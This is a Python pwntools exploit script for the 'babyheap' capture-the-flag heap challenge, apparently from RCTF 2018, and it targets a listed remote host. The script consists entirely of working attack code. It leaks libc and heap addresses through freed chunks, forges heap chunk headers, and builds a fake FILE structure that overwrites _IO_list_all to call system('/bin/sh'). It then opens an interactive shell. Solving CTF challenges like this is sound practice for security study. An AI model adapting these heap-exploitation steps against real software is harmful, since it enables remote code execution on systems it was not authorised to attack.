#!/usr/bin/env python
from pwn import *
from hexdump import hexdump

def alloc(size,content):
    s.sendlineafter('choice: ', '1')
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('content: ', content)

def show(index):
    s.sendlineafter('choice: ', '2')
    s.sendlineafter('index: ', str(index))
    s.recvuntil('content: ')
    return s.recvline(False)

def delete(index):
    s.sendlineafter('choice: ', '3')
    s.sendlineafter('index: ', str(index))

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./babyheap', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('babyheap.2018.teamrois.cn', 3154)

    libc = ELF('./libc.so.6')

    alloc(0x18, 'A')
    delete(0)
    alloc(0x100, 'A' * 0xf0 + p32(0x100))
    alloc(0x100, 'A') # 1
    delete(0)
    alloc(0x18, 'A' * 0x18) # 0
    alloc(0x90, 'A') # 2
    alloc(0x58, 'A') # 3
    delete(2)
    delete(1)
    alloc(0x90, 'A') # 1
    alloc(0x90, 'A') # 2
    alloc(0x90, 'A') # 4
    alloc(0x90, 'A') # 5
    alloc(0x90, 'A') # 6
    delete(2)
    libc_base = u64(show(3).ljust(8, '\0')) - 0x3c4b78
    log.info('libc base: %#x' % libc_base)

    alloc(0x90, 'A') # 2
    delete(5)
    delete(2)
    heap_addr = u64(show(3).ljust(8, '\0')) - 0x140
    log.info('heap address: %#x' % heap_addr)

    delete(4)
    delete(1)
    delete(0)

    alloc(0x70, 'A') # 0
    alloc(0x100, 'A' * 0x18 + p64(0xa1) + 'A' * 0x98 + p64(0x21) + 'A' * 0x18 + p64(0x21)) # 1
    alloc(0x40, 'A')
    delete(1)
    delete(3)

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    payload = ''
    payload += p64(libc_base + libc.symbols['system'])
    payload += 'A' * 8
    payload += '/bin/sh\0'
    payload += p64(0x61)
    payload += 'A' * 8
    payload += p64(libc_base + libc.symbols['_IO_list_all'] - 0x10)
    payload += p64(0) + p64(1)
    payload = payload.ljust(0x70, 'A')
    payload += p64(0x60)
    payload += p64(0x20)
    payload += 'A' * 0x50
    payload += p64(0)
    payload += 'A' * 0x10
    payload += p64(heap_addr - 0x28)

    alloc(0x100, payload)

    s.sendlineafter('choice: ', '1')
    s.sendlineafter('size: ', str(0x100))
    s.interactive()
